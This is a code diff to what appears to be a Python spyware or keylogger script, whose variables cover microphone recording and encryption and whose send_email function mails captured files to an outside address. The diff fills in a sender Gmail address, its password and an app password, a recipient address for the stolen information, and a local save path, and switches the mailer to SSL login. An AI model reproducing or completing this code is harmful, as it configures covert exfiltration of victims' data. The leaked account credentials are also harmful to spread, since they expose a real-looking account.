@@ -45,16 +45,17 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = " " # Enter disposable email here
-password = " " # Enter email password here
+email_address = "pange3205@gmail.com" # Enter disposable email here
+password = "bhaagbsdk@69" # Enter email password here
+app_password = "dxabxghyblagzaij"
 
 username = getpass.getuser()
 
-toaddr = " " # Enter the email address you want to send your information to
+toaddr = "amanchaman6942@gmail.com" # Enter the email address you want to send your information to
 
 key = " " # Generate an encryption key from the Cryptography folder
 
-file_path = " " # Enter the file path you want your files to be saved to
+file_path = "D:\\response_404\\Proj Data" # Enter the file path you want your files to be saved to
 extend = "\\"
 file_merge = file_path + extend
 
@@ -88,11 +89,8 @@ def send_email(filename, attachment, toaddr):
 
     msg.attach(p)
 
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-
-    s.starttls()
-
-    s.login(fromaddr, password)
+    s = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    s.login(fromaddr, app_password)
 
     text = msg.as_string()
 
